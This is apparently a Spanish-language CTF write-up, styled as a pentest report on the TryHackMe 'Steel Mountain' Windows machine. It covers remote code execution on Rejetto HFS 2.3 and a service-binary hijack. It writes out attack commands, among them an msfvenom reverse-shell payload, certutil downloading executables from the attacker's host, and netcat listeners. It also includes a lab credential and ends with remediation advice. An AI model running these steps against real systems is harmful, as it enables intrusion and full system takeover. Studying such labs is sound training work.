# Reto 6 - Steel Mountain – Informe Técnico de Pentesting

## INDICE
- [1. Portada](#1-portada)
- [2. Resumen Ejecutivo](#2-resumen-ejecutivo)
- [3. Alcance](#3-alcance)
- [4. Metodología](#4-metodología)
- [5. Resolución paso a paso - Evidencias](#5-resolución-paso-a-paso---evidencias)
- [6. Tabla de comandos](#6-tabla-de-comandos)
- [7. MITRE ATT&CK](#7-mitre-attck)
- [8. Conclusiones y Recomendaciones](#8-conclusiones-y-recomendaciones)
- [9. Deslinde de responsabilidad](#9-deslinde-de-responsabilidad)

---

## 1. Portada
- **Título:** Reto 6 - Steel Mountain
- **Autor:** Mtro. Mitchell Correa - Consultor en Ciberseguridad Ofensiva
- **Fecha:** 11/DIC/2025
- **Plataforma:** THM **(PARTE DE LA CERTIFICACION PMJ)**
- **Nivel de confidencialidad:** EDUCATIVO

---

## 2. Resumen Ejecutivo
En este reporte se detalla el compromiso total de la máquina **Steel Mountain**, un servidor Windows cuya superficie de ataque reveló debilidades críticas tanto en aplicaciones de terceros como en la configuración de servicios del sistema operativo. 

La intrusión comenzó con una fase de reconocimiento que identificó un servidor web **Rejetto HTTP File Server (HFS) 2.3** vulnerable a ejecución remota de código (**CVE-2014-6287**). Mediante la explotación de esta vulnerabilidad, se obtuvo acceso inicial como el usuario local `bill`.

Durante la fase de post-explotación, se utilizó la herramienta **WinPEAS** para enumerar vectores de escalada de privilegios. Se detectaron dos hallazgos fundamentales: credenciales de **AutoLogon** almacenadas y un servicio de terceros (**Advanced SystemCare**) con permisos de escritura deficientes y una ruta de ejecutable vulnerable. Se procedió a realizar un ataque de **Service Binary Hijacking**, suplantando el ejecutable legítimo por un payload generado con **msfvenom**. Al reiniciar el servicio, se obtuvo una shell reversa con los máximos privilegios posibles: `NT AUTHORITY\SYSTEM`, permitiendo el acceso a las flags de usuario y administrador.

---

## 3. Alcance

### Activos Identificados
| IP Objetivo | Sistema Operativo | Rol |
| :--- | :--- | :--- |
| 10.82.140.41 | Windows Server 2012 R2 | Servidor Web / File Server |

### Servicios Detectados
| Puerto | Servicio | Producto/Versión |
| :--- | :--- | :--- |
| 80/tcp | HTTP | Microsoft IIS httpd 8.5 |
| 135/tcp | RPC | Microsoft Windows RPC |
| 139/tcp | NetBIOS | Microsoft Windows netbios-ssn |
| 445/tcp | SMB | Microsoft Windows Server 2008 R2 - 2012 |
| 3389/tcp | RDP | Microsoft Terminal Services |
| 8080/tcp | HTTP | Rejetto HttpFileServer httpd 2.3 |

---

## 4. Metodología
1. **Reconocimiento**: Identificación de host activo, escaneo de puertos y fingerprinting de servicios.
2. **Análisis de Vulnerabilidades**: Búsqueda de exploits públicos (Searchsploit/Exploit-DB) para versiones de software específicas.
3. **Explotación**: Ejecución de RCE sobre Rejetto HFS para obtener acceso inicial.
4. **Post-Explotación**: Enumeración local del sistema para identificar vectores de escalada de privilegios (PrivEsc).
5. **Escalada de Privilegios**: Abuso de servicios mal configurados (Service Hijacking) para obtener privilegios de SYSTEM.

---

## 5. Resolución paso a paso - Evidencias

### Evidencia 1 – Análisis de IP y SO (TTL) con Script Personalizado
* **Objetivo**: Determinar la disponibilidad del objetivo e inferir el sistema operativo.
* **Comandos útiles**: `ping 10.82.140.41`
* **Qué hizo (técnico)**: Se utilizó un script para enviar paquetes ICMP; el valor de TTL (126) sugiere que el objetivo es una máquina Windows.
* **Persona común**: Es como enviar una carta de prueba para ver si alguien vive allí y notar por el sello que es una oficina específica (Windows).
* **Etiqueta**: Evidencia 1 – Análisis de IP y SO (TTL) con Script Personalizado

### Evidencia 2 – Análisis de puertos, versiones y vulnerabilidades
* **Objetivo**: Identificar la superficie de ataque completa.
* **Comandos útiles**: `nmap -n -Pn -sV -sC -p- --min-rate 4000 10.82.140.41`
* **Qué hizo (técnico)**: Escaneo agresivo que reveló servicios abiertos, destacando el puerto 8080 con Rejetto HFS 2.3.
* **Persona común**: Revisar cada puerta y ventana de un edificio para ver cuáles están abiertas.
* **Etiqueta**: Evidencia 2 – Análisis de puertos, versiones y vulnerabilidades

### Evidencia 3 – Análisis con Gobuster a IP y puerto 80 y 8080
* **Objetivo**: Descubrir directorios ocultos en los servidores web.
* **Comandos útiles**: `gobuster dir -u http://10.82.140.41:80 -w /usr/share/wordlists/dirb/common.txt` y `gobuster dir -u http://10.82.140.41:8080 -w /usr/share/wordlists/dirb/common.txt`
* **Qué hizo (técnico)**: Fuerza bruta de directorios que identificó la ruta `/img/`.
* **Persona común**: Probar llaves comunes en puertas interiores para ver a qué habitaciones se accede.
* **Etiqueta**: Evidencia 3 – Análisis con Gobuster a IP y puerto 80 y 8080

### Evidencia 4 – Reporte de Versiones en HTML
* **Objetivo:** Visualización estructurada de los servicios.
* **Qué hizo (técnico):** Análisis del reporte generado por Nmap, confirmando Microsoft IIS 8.5 en el puerto 80.
* **Persona común:** Es como tener un catálogo impreso donde se detalla exactamente qué marca y modelo es cada cerradura de la casa.
* **Etiqueta:** Evidencia 4 – Reporte de Versiones en HTML

### Evidencia 5 – Análisis de Vulnerabilidades en HTML
* **Objetivo:** Identificar fallos conocidos automáticamente.
* **Qué hizo (técnico):** Revisión de scripts NSE de Nmap para detectar desconfiguraciones.
* **Persona común:** Es como usar una aplicación que te dice si el modelo de tu alarma tiene fallos reportados en internet.
* **Etiqueta:** Evidencia 5 – Análisis de Vulnerabilidades en HTML

### Evidencia 6 – Comprobación de Dirección IP
* **Objetivo:** Confirmar que el target responde a la IP asignada en el laboratorio.
* **Qué hizo (técnico):** Se validó la resolución de red y la interfaz visual del servidor web principal para asegurar que el tráfico se dirige al host correcto.
* **Persona común:** Verificar que el número de la casa en la que estamos trabajando coincide con la dirección que nos dieron en el contrato.
* **Etiqueta:** Evidencia 6 – Comprobación de Dirección IP

### Evidencia 7 – Análisis de Archivos .txt de Gobuster
* **Objetivo:** Revisar el contenido de los logs de enumeración.
* **Qué hizo (técnico):** Se inspeccionaron los resultados guardados en `gobuster.txt` para mapear la estructura lógica del servidor y confirmar las rutas accesibles con código 200 OK.
* **Persona común:** Revisar las notas que tomamos al intentar abrir puertas para ver cuáles cedieron y nos permitieron ver el interior.
* **Etiqueta:** Evidencia 7 – Análisis de Archivos .txt de Gobuster

### Evidencia 8 – Análisis de la ruta `/img/`
* **Objetivo:** Explorar el contenido del directorio de imágenes.
* **Qué hizo (técnico):** El acceso devolvió un error 403 Forbidden, indicando que el listado de directorios está desactivado.
* **Persona común:** Intentar mirar por el ojo de una cerradura y darte cuenta de que está tapado desde el otro lado.
* **Etiqueta:** Evidencia 8 – Análisis de la ruta `/img/`

### Evidencia 9 – Análisis de Imagen en Home Page
* **Objetivo:** Extraer metadatos o nombres de archivos de la página principal. `108.82.xxx.xx/img/BillHarper.png` 
* **Qué hizo (técnico):** Identificación de la imagen del "Empleado del mes", clave para el reconocimiento de usuarios y en la barra de explorasion se encontro el nombre del empleado **BillHarper**.
* **Persona común:** Mirar el cuadro del "empleado destacado" en la recepción para saber el nombre de una persona que trabaja allí y usarlo para engañar al sistema.
* **Etiqueta:** Evidencia 9 – Análisis de Imagen en Home Page

### Evidencia 10 – Análisis de Puerto 8080 (Rejetto HFS)
* **Objetivo:** Validar el servicio de intercambio de archivos.
* **Qué hizo (técnico):** Confirmación visual de Rejetto HttpFileServer versión 2.3.
* **Persona común:** Descubrir una puerta trasera que utiliza un sistema de almacenamiento de archivos muy antiguo y poco seguro.
* **Etiqueta:** Evidencia 10 – Análisis de Puerto 8080 (Rejetto HFS)

### Evidencia 11 – Identificación de Vulnerabilidad (CVE-2014-6287)
* **Objetivo:** Investigar el vector de ataque para Rejetto.
* **Qué hizo (técnico):** Confirmación de una vulnerabilidad crítica de inyección de código.
* **Persona común:** Leer un boletín de noticias que dice que el modelo exacto de la caja fuerte del edificio se puede abrir con un imán específico.
* **Etiqueta:** Evidencia 11 – Identificación de Vulnerabilidad (CVE-2014-6287)

### Evidencia 12 – Verificación de Exploit en Exploit-db
* **Objetivo:** Encontrar código de explotación verificado.
* **Qué hizo (técnico):** Se localizó el EDB-ID 39161 en la base de datos de Exploit-DB, correspondiente a un script en Python diseñado para automatizar el RCE contra HFS 2.3.
* **Persona común:** Buscar en una enciclopedia de cerrajería las instrucciones exactas para fabricar la herramienta que abre la puerta vulnerable.
* **Etiqueta:** Evidencia 12 – Verificación de Exploit en Exploit-db

### Evidencia 13 – Comparativa de Exploits Disponibles
* **Objetivo:** Seleccionar el exploit más estable (Metasploit vs Python).
* **Qué hizo (técnico):** Se compararon diferentes versiones del exploit (Metasploit vs scripts manuales) para asegurar la compatibilidad con el entorno de Windows Server 2012 R2.
* **Persona común:** Elegir entre usar una herramienta automática profesional o una manual que nosotros mismos podemos ajustar.
* **Etiqueta:** Evidencia 13 – Comparativa de Exploits Disponibles

### Evidencia 14 – Uso de Searchsploit
* **Objetivo:** Descargar el exploit localmente en Kali Linux.
* **Qué hizo (técnico):** Se utilizó la herramienta CLI de Exploit-DB para filtrar y localizar la ruta del archivo `.py` dentro del repositorio local de Kali Linux.
* **Comandos:** `searchsploit Rejetto`
* **Persona común:** Buscar en nuestra maleta de herramientas si ya tenemos la llave maestra necesaria para este sistema.
* **Etiqueta:** Evidencia 14 – Uso de Searchsploit

### Evidencia 15 – Descarga del exploit.py
* **Comandos:** `searchsploit *m 39161`
* **Qué hizo (técnico):** Se copió el script de Python al directorio de trabajo actual.
* **Persona común:** Sacar el manual de instrucciones y la herramienta específica de nuestro kit y ponerlos sobre la mesa de trabajo.
* **Etiqueta:** Evidencia 15 – Descarga del exploit.py

### Evidencia 16 – Preparación de Binarios (nc.exe)
* **Objetivo:** Obtener el binario de Netcat para Windows.
* **Comandos:** `cp /usr/share/windows-resources/binaries/nc.exe`.
* **Qué hizo (técnico):** Se copió el ejecutable legítimo de Netcat al directorio de transferencia para ser enviado a la víctima como mecanismo de shell reversa.
* **Persona común:** Preparar un pequeño walkie-talkie que vamos a esconder dentro de la oficina para comunicarnos con el exterior una vez que entremos.
* **Etiqueta:** Evidencia 16 – Preparación de Binarios (nc.exe)

### Evidencia 17 – Servidor Python para Transferencia
* **Objetivo:** Alojar los archivos para que la víctima los descargue.
* **Comandos:** `python3 -m http.server 80`
* **Qué hizo (técnico):** Se levantó un servidor HTTP local en el puerto 80 para facilitar la entrega de herramientas (`nc.exe`, `winPEAS.exe`) al host remoto mediante solicitudes GET.
* **Persona común:** Poner una mesa en el pasillo con nuestras herramientas disfrazadas de paquetes de correo para que el personal del edificio las meta por nosotros.
* **Etiqueta:** Evidencia 17 – Servidor Python para Transferencia

### Evidencia 18 – Edición del Script y Listener 443
* **Objetivo:** Configurar la IP del atacante en el exploit y preparar la escucha.
* **Qué hizo (técnico):** Se modificaron las variables `ip_addr` y `local_port` dentro del exploit de Rejetto para apuntar a la VPN del atacante y se inició un listener con Netcat en el puerto 443.
* **Persona común:** Sintonizar nuestra radio en una frecuencia específica y esperar a que el walkie*talkie que enviamos empiece a transmitir.
* **Etiqueta:** Evidencia 18 – Edición del Script y Listener 443

### Evidencia 19 – Ejecución del Script de Explotación
* **Comandos:** `python2 39161.py 10.82.140.41 8080`
* **Resultado:** Obtención de una shell reversa como el usuario `bill`.
* **Qué hizo (técnico):** Se lanzó el exploit contra el puerto 8080 del objetivo. El script activó la ejecución de comandos en la víctima, forzándola a conectar de vuelta al listener del atacante.
* **Persona común:** Activar el mecanismo de la puerta trasera y recibir la señal de que ya estamos dentro, operando con la identidad de un empleado llamado Bill.
* **Etiqueta:** Evidencia 19 – Ejecución del Script de Explotación

### Evidencia 20 – Verificación de Permisos Iniciales
* **Objetivo:** Comprobar el nivel de acceso en la carpeta raíz.
* **Qué hizo (técnico):** Tras obtener la shell, se ejecutaron comandos `dir` y `cd \` para mapear el sistema de archivos; se confirmó el acceso inicial como el usuario `bill`.
* **Persona común:** Caminar por los pasillos principales del edificio para ver a qué habitaciones nos deja entrar la tarjeta de identificación de Bill.
* **Etiqueta:** Evidencia 20 – Verificación de Permisos Iniciales

### Evidencia 21 – Localización de User Flag
* **Objetivo:** Capturar la bandera de usuario en `C:\Users\bill\Desktop`.
* **Comandos:** `type user.txt`
* **Qué hizo (técnico):** Se navegó al directorio `C:\Users\bill\Desktop` donde se localizó y leyó el contenido del archivo de flag de usuario.
* **Persona común:** Entrar en la oficina personal de Bill y tomar el sobre con el primer código secreto que está sobre su escritorio.
* **Etiqueta:** Evidencia 21 – Localización de User Flag

### Evidencia 22 – Transferencia de WinPEAS y ejecución
* **Objetivo:** Enumerar vectores de escalada de privilegios.
* **Comandos:** `certutil.exe -urlcache -f http://IP/winPEASx64.exe wp64.exe`, `wp64.exe`
* **Qué hizo (técnico):** Se utilizó el binario del sistema `certutil` para descargar la herramienta de enumeración avanzada WinPEAS desde el servidor Python del atacante.
* **Persona común:** Meter de contrabando un detector de metales y planos avanzados para encontrar las cajas fuertes ocultas en la oficina de Bill.
* **Etiqueta:** Evidencia 22 – Transferencia de WinPEAS y ejecución

### Evidencia 23 – Análisis de Hashes con WinPEAS
* **Objetivo:** Identificar si existen hashes de contraseñas en memoria.
* **Qué hizo (técnico):** WinPEAS detectó la presencia de un hash NTLMv2 para el usuario `bill`, el cual fue recolectado para posibles ataques de craqueo offline.
* **Persona común:** Buscar restos de combinaciones escritas en papeles o grabadas en los teclados de la oficina para intentar entrar en otros lugares.
* **Etiqueta:** Evidencia 23 – Análisis de Hashes con WinPEAS

### Evidencia 24 – Hallazgo de Credenciales AutoLogon
* **Objetivo:** Identificar credenciales en texto plano en el registro.
* **Resultado:** Contraseña de AutoLogon detectada: `PMBAf5KhZAxVhvqb`.
* **Qué hizo (técnico):** La herramienta WinPEAS reveló una vulnerabilidad crítica: la contraseña de AutoLogon del usuario `bill` estaba almacenada en texto claro en el registro de Windows.
* **Persona común:** Encontrar un post*it pegado debajo del teclado con la contraseña de inicio de sesión de Bill.
* **Etiqueta:** Evidencia 24 – Hallazgo de Credenciales AutoLogon

### Evidencia 25 – Identificación de Servicio Vulnerable
* **Objetivo:** Localizar servicios con rutas sin comillas (Unquoted Service Paths).
* **Resultado:** Servicio "Advanced SystemCare Service 9" identificado como vector de PrivEsc.
* **Qué hizo (técnico):** Se identificó el servicio "Advanced SystemCare Service 9" con un "Unquoted Service Path" en `C:\Program Files (x86)\IObit\Advanced SystemCare`, permitiendo la inyección de binarios maliciosos.
* **Persona común:** Descubrir que el ascensor de carga tiene un fallo: si pones un objeto en un lugar específico, te lleva directamente al piso del director sin pedir llave.
* **Etiqueta:** Evidencia 25 – Identificación de Servicio Vulnerable

### Evidencia 26 – Comprobación con NetExec
* **Objetivo:** Validar las credenciales de `bill` vía SMB.
* **Comandos:** `netexec smb 10.82.140.41 -u 'bill' -p 'PMBAf5KhZAxVhvqb' --local-auth `.
* **Qué hizo (técnico):** Se utilizó NetExec para confirmar que la contraseña obtenida del registro era válida para el dominio y que el usuario tenía privilegios limitados pero verificables en la red.
* **Persona común:** Probar la contraseña que encontramos en otras puertas del edificio para ver si Bill tiene acceso a más áreas de las que pensábamos.
* **Etiqueta:** Evidencia 26 – Comprobación con NetExec

### Evidencia 27 – Navegación a Directorio de Programas
* **Objetivo:** Localizar la ruta física del servicio vulnerable.
* **Comandos:** `cd`, `dir`
* **Qué hizo (técnico):** Se validó la existencia de la carpeta de IObit en archivos de programa (x86) y se confirmaron los permisos de escritura para el grupo de usuarios.
* **Persona común:** Ir físicamente hasta el cuarto de máquinas del ascensor defectuoso para ver cómo podemos manipularlo.
* **Etiqueta:** Navegación a Directorio de Programas

### Evidencia 28 – Verificación de Binario ASCService.exe
* **Objetivo:** Confirmar que el binario reportado por WinPEAS existe.
* **Qué hizo (técnico):** Se listó el contenido del directorio para identificar el ejecutable `ASCService.exe`, el cual sería suplantado en el ataque de secuestro de servicios.
* **Persona común:** Comprobar que el motor del ascensor que queremos cambiar es exactamente el que nos dijeron los planos.
* **Etiqueta:** Evidencia 28 – Verificación de Binario ASCService.exe

### Evidencia 29 – Comprobación de Estado de Servicios
* **Objetivo:** Verificar si el usuario `bill` puede reiniciar servicios.
* **Comandos:** `wmic service get name, displayname, pathname, startmode
| findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
wmic service get name, displayname, pathname, startmode | findstr /i "auto" | findstr /i /v "C:\Windows\
\" | findstr /i /v """ `.
* **Qué hizo (técnico):** Se ejecutó el comando `wmic service get name,displayname,pathname,startmode` para confirmar que el servicio vulnerable estaba en modo Auto y era manipulable por `bill`.
* **Persona común:** Ver si con nuestra tarjeta de Bill podemos apagar y encender el interruptor de energía del cuarto de máquinas.
* **Etiqueta:** Evidencia 29 – Comprobación de Estado de Servicios

### Evidencia 30 – Generación de Payload (Advanced.exe)
* **Objetivo:** Crear el binario suplantador con MSFVenom.
* **Comandos:** `msfvenom *p windows/x64/shell_reverse_tcp LHOST=... LPORT=4444 *f exe *o Advanced.exe`.
* **Qué hizo (técnico):** Se generó un payload en formato `.exe` aprovechando la vulnerabilidad de espacio en el nombre de la ruta para que Windows ejecute `Advanced.exe` en lugar del servicio legítimo.
* **Persona común:** Construir una pieza de repuesto trucada para el motor del ascensor que nos dará el control total cuando se instale.
* **Etiqueta:** Evidencia 30 – Generación de Payload (Advanced.exe)

### Evidencia 31 – Transferencia del Payload al Objetivo
* **Comandos:** `certutil.exe *urlcache *f http://IP/Advanced.exe Advanced.exe`
* **Qué hizo (técnico):** El binario malicioso se transfirió directamente al directorio `C:\Program Files (x86)\IObit` aprovechando los permisos de escritura deficientes del usuario `bill`.
* **Persona común:** Llevar nuestra pieza trucada hasta el cuarto de máquinas sin que nadie nos vea.
* **Etiqueta:** Evidencia 31 – Transferencia del Payload al Objetivo

### Evidencia 32 – Hijacking del Servicio
* **Objetivo:** Detener el servicio original e iniciar el payload.
* **Comandos:** `sc stop AdvancedSystemCareService9` / `sc start AdvancedSystemCareService9`
* **Qué hizo (técnico):** Se forzó el reinicio del servicio de IObit. Al arrancar, el sistema operativo ejecutó el payload `Advanced.exe` con privilegios de SYSTEM.
* **Persona común:** Quitar el motor original del ascensor, poner el nuestro y encender el interruptor.
* **Etiqueta:** Evidencia 32 – Hijacking del Servicio

### Evidencia 33 – Obtención de Shell como SYSTEM
* **Objetivo:** Confirmar el compromiso total del servidor.
* **Comandos:** `whoami` *> `nt authority\system`.
* **Qué hizo (técnico):** Se recibió una nueva conexión en el listener de Netcat. El comando `whoami` confirmó que la shell operaba con los máximos privilegios administrativos del sistema.
* **Persona común:** Recibir la señal en nuestra radio de que el ascensor ya nos dio acceso a la oficina del director general (Control Total).
* **Etiqueta:** Evidencia 33 – Obtención de Shell como SYSTEM

### Evidencia 34 – Navegación al Escritorio del Administrador
* **Objetivo:** Acceder a información restringida del administrador.
* **Qué hizo (técnico):** Con privilegios de SYSTEM, se navegó sin restricciones al directorio `C:\Users\Administrator\Desktop` para recolectar las flags finales del reto.
* **Persona común:** Entrar físicamente en el despacho del director y sentarnos en su silla.
* **Etiqueta:** Evidencia 34 – Navegación al Escritorio del Administrador

### Evidencia 35 – Captura de Root Flag
* **Objetivo:** Capturar la bandera de administrador.
* **Comandos:** `type root.txt`
* **Qué hizo (técnico):** Se leyó el archivo de flag de administrador, completando así el objetivo principal de la intrusión.
* **Persona común:** Abrir la caja fuerte principal que está detrás del cuadro del director y tomar el último documento secreto.
* **Etiqueta:** Evidencia 35 – Captura de Root Flag

---

## 6. Tabla de comandos

| # | Comando | Descripción |
|---|---|---|
| 1 | `nmap -sV -sC -p-` | Escaneo de servicios y puertos. |
| 2 | `searchsploit -m 39161` | Descarga de exploit de Rejetto. |
| 3 | `python3 -m http.server 80` | Servidor para transferencia de archivos. |
| 4 | `nc -lvnp 443` | Listener para recibir la shell reversa. |
| 5 | `certutil -urlcache -f ...` | Descarga de binarios en la víctima. |
| 6 | `msfvenom -p ... -f exe` | Generación de payload malicioso. |
| 7 | `sc stop/start [Service]` | Manipulación de servicios de Windows. |

---

## 7. MITRE ATT&CK

| Táctica | Técnica | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Command and Scripting Interpreter | T1059 |
| Persistence | Create or Modify System Process | T1543.003 |
| Privilege Escalation | Hijack Execution Flow | T1574.011 |
| Credential Access | OS Credential Dumping | T1003 |

---

## 8. Conclusiones y Recomendaciones

* 🔥 **CRÍTICA:** Actualizar o retirar **Rejetto HFS**. Su uso en entornos productivos representa un riesgo de ejecución remota inmediata.
* ⚠️ **MEDIA:** Aplicar el principio de menor privilegio en los directorios de `C:\Program Files (x86)`. El usuario `bill` no debería tener permisos de escritura sobre binarios de servicios.
* ⚠️ **MEDIA:** Corregir las rutas de servicios agregando comillas en el registro de Windows para prevenir *Unquoted Service Path Hijacking*.

---

## 9. Deslinde de responsabilidad
Este reporte se emite con fines exclusivamente educativos. **El autor no se hace responsable del uso indebido de las técnicas aquí descritas.** 
